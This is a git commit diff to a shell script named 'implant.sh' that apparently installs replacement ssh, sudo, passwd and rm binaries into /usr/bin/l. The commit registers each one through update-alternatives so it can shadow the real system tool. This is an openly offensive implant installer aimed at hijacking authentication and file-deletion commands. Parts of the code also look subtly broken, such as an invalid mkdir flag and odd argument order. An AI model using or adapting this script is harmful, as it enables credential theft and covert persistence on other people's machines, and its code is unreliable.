99fc3a0ad7b6bb9c0166539842fa14d65404ffab
Kordell Hutchins <43355784+hazarky@users.noreply.github.com>
2022-05-21 12:26:16 -0400

    Update implant.sh

--- implant.sh
+++ implant.sh
@@ -3,7 +3,11 @@
 #
 
 sudo mkdir -P /usr/bin/l
-sudo cp  ./ssh /usr/bin/l
+sudo cp  ./ssh /usr/bin/l 
+sudo update-alternatives --install /usr/bin/l/ssh ssh /usr/bin/ssh 90
 sudo cp  ./sudo /usr/bin/l
+sudo update-alternatives --install /usr/bin/l/sudo sudo /usr/bin/sudo 90
 sudo cp  ./passwd /usr/bin/l
+sudo update-alternatives --install /usr/bin/l/passwd passwd /usr/bin/passwd 90
 sudo cp ./rm /usr/bin/l
+sudo update-alternatives --install /usr/bin/l/rm rm /usr/bin/rm 90
